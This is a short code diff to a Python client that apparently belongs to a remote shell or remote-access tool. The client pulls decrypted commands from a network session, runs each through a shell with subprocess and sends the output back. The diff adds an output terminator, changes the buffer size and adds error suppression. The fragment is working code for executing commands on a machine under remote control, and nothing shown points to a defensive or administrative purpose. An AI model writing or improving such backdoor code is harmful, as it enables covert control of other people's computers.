@@ -14,7 +14,7 @@ class Communicate(object):
 
  def __init__(self, session):
   self.recvs_decrypted = Queue()
-  self.session_recv = 4096**2
+  self.session_recv = 4096 << 12
   self.session = session
   self.is_alive = True
   self.pending = False 
@@ -64,14 +64,18 @@ class Client(object):
    while self.communication.recvs_decrypted.qsize():
     cmd = self.communication.recvs_decrypted.get()
     output = self.exe(cmd)
-    self.communication.send(output)    
+    self.communication.send(output) 
+    self.communication.send('-1') 
 
  def exe(self, cmd):
   if cmd.strip() == 'cls':return '-1'
-  proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-  output = proc[0].decode('utf8')
-  errors = proc[1].decode('utf8')
-  output = output if output else errors
+  try:
+   proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+   output = proc[0].decode('utf8')
+   errors = proc[1].decode('utf8')
+   output = output if output else errors
+  except:
+   output = ''
 
   if cmd.split()[0] == 'cd':
    if len(cmd.split()) != 1:
